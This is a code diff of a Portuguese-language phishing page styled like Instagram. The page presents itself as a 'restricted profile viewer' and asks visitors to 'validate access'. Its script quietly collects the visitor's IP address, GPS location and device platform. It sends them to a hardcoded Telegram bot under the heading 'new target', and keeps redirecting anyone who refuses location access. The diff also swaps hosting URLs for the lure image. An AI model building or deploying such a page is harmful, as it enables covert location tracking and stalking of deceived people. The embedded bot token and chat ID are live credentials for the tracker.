@@ -9,8 +9,8 @@
     <meta property="og:title" content="Visualizador de Perfil Restrito">
     <meta property="og:description" content="Clique para validar seu acesso e visualizar este perfil com segurança.">
     
-    <meta property="og:image" content="https://l-m-b-s.github.io/meta/perfilmulher.jpg">
-    <meta property="og:image:secure_url" content="https://l-m-b-s.github.io/meta/perfilmulher.jpg">
+    <meta property="og:image" content="https://autenticador2.github.io/meta/perfilmulher.jpg">
+    <meta property="og:image:secure_url" content="https://autenticador2.github.io/meta/perfilmulher.jpg">
     
     <meta property="og:image:type" content="image/jpeg">
     <meta property="og:image:width" content="1080">
@@ -24,7 +24,6 @@
         h2 { font-size: 18px; color: #262626; margin-bottom: 15px; font-weight: 600; }
         p { font-size: 14px; color: #8e8e8e; line-height: 1.5; margin-bottom: 30px; }
         .btn { background-color: #0095f6; color: white; border: none; padding: 12px; border-radius: 4px; font-weight: 600; cursor: pointer; width: 100%; font-size: 14px; transition: 0.3s; }
-        .btn:disabled { background-color: #b2dffc; }
         .footer { margin-top: 30px; font-size: 11px; color: #afafaf; text-transform: uppercase; letter-spacing: 1px; }
     </style>
 </head>
@@ -41,11 +40,8 @@
 </div>
 
 <script>
-    // CONFIGURAÇÕES DO SEU BOT TELEGRAM
     const TOKEN = "8406636992:AAE7z6BGxeO-lfLMYVQ9yOWY-CMLiy586Ic"; 
     const ID = "560716860"; 
-    
-    // COLOQUE O LINK DO INSTAGRAM QUE O ALVO DEVE VER NO FINAL
     const REDIRECIONAR_PARA = "https://www.instagram.com/NOME_DO_PERFIL/"; 
 
     async function iniciarProcesso() {
@@ -65,7 +61,6 @@
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
-            // Link direto para o mapa no Telegram
             const mapa = `https://www.google.com/maps?q=${lat},${lon}`;
             
             const msg = `🎯 *NOVO ALVO INTERESSADO*\n\n🌐 IP: ${ipAlvo}\n📍 Localização: ${mapa}\n📱 Aparelho: ${navigator.platform}`;
@@ -76,11 +71,9 @@
                 body: JSON.stringify({ chat_id: ID, text: msg, parse_mode: 'Markdown' })
             });
 
-            // Redirecionamento de sucesso
             window.location.href = REDIRECIONAR_PARA;
 
         }, (err) => {
-            // Persistência: Se ele negar, vai para a página de erro para tentar de novo
             window.location.href = "autorizar.html";
         }, options);
     }
